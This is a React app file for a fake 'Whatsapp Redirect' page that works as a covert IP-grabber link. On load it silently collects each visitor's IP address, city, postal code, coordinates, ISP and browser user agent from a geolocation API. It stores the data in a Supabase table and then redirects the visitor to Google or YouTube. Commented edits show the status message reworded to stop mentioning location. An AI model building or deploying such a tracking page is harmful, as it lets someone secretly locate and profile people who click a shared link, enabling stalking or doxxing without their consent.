import { useEffect, useState } from "react";
import "./App.css";
import { supabase } from "./supabaseClient";

export default function App() {
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  useEffect(() => {
    const logLocationAndRedirect = async () => {
      try {
        setLoading(true);
        // setMessage("Mengambil lokasi dan menyimpan ke Supabase...");
        setMessage("Mengambil data dan menyimpan ke Supabase...");

        const path = window.location.pathname || "/";
        const slug = path.replace(/^\/+|\/+$/g, "") || "root";

        let redirectUrl = "https://www.google.com";
        if (slug === "youtube") {
          redirectUrl = "https://www.youtube.com";
        } else if (slug === "google") {
          redirectUrl = "https://www.google.com";
        }

        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("Gagal mengambil data IP");
        const json = await res.json();

        const payload = {
          source_path: path,
          source_slug: slug,
          ip: json.ip || null,
          city: json.city || null,
          region: json.region || null,
          country: json.country_name || null,
          postal: json.postal || null,
          latitude: json.latitude || null,
          longitude: json.longitude || null,
          timezone: json.timezone || null,
          isp: json.org || null,
          user_agent: navigator.userAgent,
          visited_at: new Date().toISOString(),
        };

        const { error } = await supabase.from("location_logs").insert([payload]);
        if (error) throw error;

        // setMessage("Berhasil menyimpan lokasi. Mengarahkan ke tujuan...");
        setMessage("Berhasil menyimpan. Mengarahkan ke tujuan...");

        window.location.href = redirectUrl;
      } catch (err) {
        console.error(err);
        setMessage(err.message || "Terjadi kesalahan.");
      } finally {
        setLoading(false);
      }
    };

    logLocationAndRedirect();
  }, []);

  return (
    <div className="page">
      <div className="card">
        <h1>Whatsapp Redirect</h1>
        <p className="subtitle">Sedang memproses lokasi kunjungan Anda...</p>

        {message && <p className="message">{message}</p>}
        {loading && <p className="message">Mohon tunggu sebentar...</p>}
      </div>
    </div>
  );
}